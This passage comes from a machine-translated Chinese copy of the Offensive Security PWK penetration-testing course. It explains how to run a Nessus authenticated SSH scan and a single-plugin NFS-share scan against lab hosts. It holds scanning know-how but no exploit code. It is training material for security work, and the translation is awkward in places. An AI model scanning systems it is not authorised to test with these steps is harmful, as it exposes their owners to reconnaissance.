<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:9053;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 71：认证扫描的基本配置</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:9084;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Credentials</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项卡和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类别。</font><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证方法</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下拉菜单中，</font></font></nobr></div>
<div style="position:absolute;top:9103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">password</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，将用户名设置为“root”，并为我们的 Debian 客户端提供密码。</font></font></nobr></div>
<div style="position:absolute;top:9123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正确的配置可以在图 72 中看到：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:9546;left:357"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 72：输入 SSH 凭证 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:9679;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="9"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 9 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:9712;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:10789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:10789;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:10789;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">229</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:9802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.5.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:9823;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然我们将仅在此示例中使用 SSH 配置，但我们可以轻松查看其他配置</font></font></nobr></div>
<div style="position:absolute;top:9842;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类别</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下拉菜单和</font><font style="vertical-align: inherit;">Nessus 支持的身份验证机制</font></font></nobr></div>
<div style="position:absolute;top:9861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:9894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们可以单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Save</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">旁边的箭头</font><font style="vertical-align: inherit;">，然后</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:10221;left:373"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 73：启动扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:10252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与未经身份验证的扫描一样，当扫描正在进行时，状态报告为“正在运行”。</font></font></nobr></div>
<div style="position:absolute;top:10271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦扫描达到“已完成”状态，我们可以点击扫描名称打开列表</font></font></nobr></div>
<div style="position:absolute;top:10291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机并单击 Debian 客户端的 IP。</font><font style="vertical-align: inherit;">这显示了已发现漏洞的列表，这些漏洞可能</font></font></nobr></div>
<div style="position:absolute;top:10310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可在 Debian 目标上利用：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:10722;left:368"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 74：查看结果 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:10867;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="10"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 10 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:10900;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:11977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:11977;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:11977;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">230</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:10990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.5.1.2</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:11011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此视图中，请注意漏洞与补丁号一起列出。</font><font style="vertical-align: inherit;">这是因为在</font></font></nobr></div>
<div style="position:absolute;top:11030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在扫描的发现阶段，Nessus 确定目标正在运行 Debian 操作系统</font></font></nobr></div>
<div style="position:absolute;top:11049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统并仅执行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Debian 本地安全检查</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插件。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">233</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以看到</font></font></nobr></div>
<div style="position:absolute;top:11069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证扫描成功，因为扫描仪现在可以查看易受攻击的应用程序</font></font></nobr></div>
<div style="position:absolute;top:11088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未远程公开的，例如 Firefox。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:11123;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.5.2 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:11153;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 按照上述步骤创建您自己的 Debian 客户端验证扫描。</font></font></nobr></div>
<div style="position:absolute;top:11181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 查看扫描结果。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:11215;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.6 使用单独的 Nessus 插件进行扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:11253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下，Nessus 将在运行默认值时启用许多幕后插件</font></font></nobr></div>
<div style="position:absolute;top:11273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模板。</font><font style="vertical-align: inherit;">虽然这在许多情况下肯定很有用，但我们也可以微调我们的选项，例如</font></font></nobr></div>
<div style="position:absolute;top:11292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，快速运行单个插件。</font><font style="vertical-align: inherit;">我们可以使用此功能来验证以前的发现或</font></font></nobr></div>
<div style="position:absolute;top:11312;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">快速发现环境中易受特定漏洞攻击的所有目标。</font></font></nobr></div>
<div style="position:absolute;top:11344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于此示例，我们将针对</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NFS 导出共享信息披露</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">234</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插件</font><font style="vertical-align: inherit;">运行</font></font></nobr></div>
<div style="position:absolute;top:11363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验室中的“Beta”主机。</font><font style="vertical-align: inherit;">我们可以使用这个插件从 RPC 服务器（端口 111）收集信息</font></font></nobr></div>
<div style="position:absolute;top:11383;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并验证目标是否正在导出任何 NFS 共享。</font></font></nobr></div>
<div style="position:absolute;top:11416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要对单个插件运行扫描，我们将再次</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从新扫描</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:11730;left:384"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 75：创建扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:11761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这一次，我们将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高级扫描</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模板。</font><font style="vertical-align: inherit;">与基本网络扫描和认证不同</font></font></nobr></div>
<div style="position:absolute;top:11781;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以前使用的补丁审核模板，高级扫描模板不使用</font></font></nobr></div>
<div style="position:absolute;top:11800;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描配置建议。</font><font style="vertical-align: inherit;">但是，该模板确实提供了一组“高级”</font></font></nobr></div>
<div style="position:absolute;top:11819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他模板通常隐藏或不可用的默认值。</font><font style="vertical-align: inherit;">请注意，高级扫描允许</font></font></nobr></div>
<div style="position:absolute;top:11839;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以选择单个插件，这是大多数其他模板不可用的选项。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:11907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">233 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Tenable，2020 年），https://www.tenable.com/plugins/nessus/families/Debian%20Local%20Security%20Checks</font></font></font></nobr></div>
<div style="position:absolute;top:11927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">234 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Tenable，2020 年），https://www.tenable.com/plugins/nessus/11356</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:12055;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="11"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 11 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:12088;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:13165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:13165;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:13165;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">231</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:12184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要使用此模板，请单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高级扫描</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡并配置名称和目标：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:12611;left:351"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 76：配置单独扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:12642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了节省时间和更安静地扫描，我们将关闭</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机发现</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，因为我们知道主机是</font></font></nobr></div>
<div style="position:absolute;top:12661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用的。</font><font style="vertical-align: inherit;">我们将通过单击</font><font style="vertical-align: inherit;">“</font><i><font style="vertical-align: inherit;">设置”</font></i><font style="vertical-align: inherit;">选项卡</font><font style="vertical-align: inherit;">下的</font><i><font style="vertical-align: inherit;">“</font></i></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发现”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt;“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机发现</font></font></i><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:12681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">取消选择“Ping 远程主机”： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:13243;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="12"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 12 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:13276;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:14353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:14353;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:14353;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">232</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:13883;left:355"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 77：删除主机发现</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:13914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了禁用主机发现，如果我们知道什么，我们还可以缩小扫描的端口列表</font></font></nobr></div>
<div style="position:absolute;top:13933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务已经运行的端口，理解服务</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并不</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总是监听</font></font></nobr></div>
<div style="position:absolute;top:13953;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认端口。</font><font style="vertical-align: inherit;">只有当我们确信服务实际上正在运行时，我们才应该这样做</font></font></nobr></div>
<div style="position:absolute;top:13972;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口。</font><font style="vertical-align: inherit;">由于我们正在扫描 RPC 服务并且我们知道 RPC 实际上运行在 TCP 端口上</font></font></nobr></div>
<div style="position:absolute;top:13991;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">111，我们只会扫描这个端口。</font></font></nobr></div>
<div style="position:absolute;top:14024;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要进行设置，我们将选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Discovery</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Port Scanning</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，然后在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Settings</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项卡下，我们将输入</font></font></nobr></div>
<div style="position:absolute;top:14044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“111”进入</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口扫描范围</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字段。</font><font style="vertical-align: inherit;">我们还将取消选中</font><i><font style="vertical-align: inherit;">本地端口</font></i><font style="vertical-align: inherit;">下的所有选项</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:14063;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部分也是如此，如图 78 所示。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:14431;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="13"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 13 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:14464;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:15541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:15541;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:15541;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">233</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:15299;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 78：最小化扫描目标</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:15330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着一些扫描选项的缩小，我们可以开始选择插件。</font><font style="vertical-align: inherit;">我们将从</font></font></nobr></div>
<div style="position:absolute;top:15350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插件</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项卡并单击右上角的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部禁用</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:15619;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="14"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 14 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:15652;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:16729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:16729;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:16729;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">234</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:15948;left:371"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 79：禁用所有插件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:15980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，扫描将运行得非常快，但不会做太多！</font><font style="vertical-align: inherit;">要扫描打开的 NFS 共享，我们将</font></font></nobr></div>
<div style="position:absolute;top:15999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导航到左侧栏中的“RPC”并在左侧栏中设置“NFS 导出共享信息披露”</font></font></nobr></div>
<div style="position:absolute;top:16018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">右列</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:16269;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 80：启用 NFS 插件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:16299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在扫描已配置，我们已准备好启动它。</font><font style="vertical-align: inherit;">为此，我们将再次单击</font></font></nobr></div>
<div style="position:absolute;top:16319;left:109"><nobr><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Save</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Launch</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">旁边的箭头</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:16807;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="15"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 15 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:16840;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:17917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:17917;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:17917;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">235</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:17323;left:373"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 81：启动扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:17353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，即使我们已将扫描仪配置为仅扫描端口 111，但运行</font></font></nobr></div>
<div style="position:absolute;top:17373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描期间的数据包捕获将显示仍有流量到其他端口。</font><font style="vertical-align: inherit;">有时候是这样的</font></font></nobr></div>
<div style="position:absolute;top:17392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为端口扫描只是 Nessus 扫描配置文件的一部分，也是最易受攻击的</font></font></nobr></div>
<div style="position:absolute;top:17412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描仪运行额外的服务和插件来收集幕后的目标信息。</font><font style="vertical-align: inherit;">那里</font></font></nobr></div>
<div style="position:absolute;top:17431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不是完全控制自动扫描仪生成的所有流量的简单方法。</font><font style="vertical-align: inherit;">这个级别</font></font></nobr></div>
<div style="position:absolute;top:17450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制只能通过手动操作来实现。</font></font></nobr></div>
<div style="position:absolute;top:17483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦扫描状态为“已完成”，我们可以点击扫描名称，然后点击 Beta 的 IP 即可</font></font></nobr></div>
<div style="position:absolute;top:17502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开已发现漏洞的列表。</font><font style="vertical-align: inherit;">导航到单个严重漏洞并单击</font></font></nobr></div>
<div style="position:absolute;top:17522;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它会显示一个详细页面，显示所有导出的 NFS 共享： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:17995;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="16"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 16 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:18028;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:19105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:19105;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:19105;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">236</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:18686;left:368"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 82：查看结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
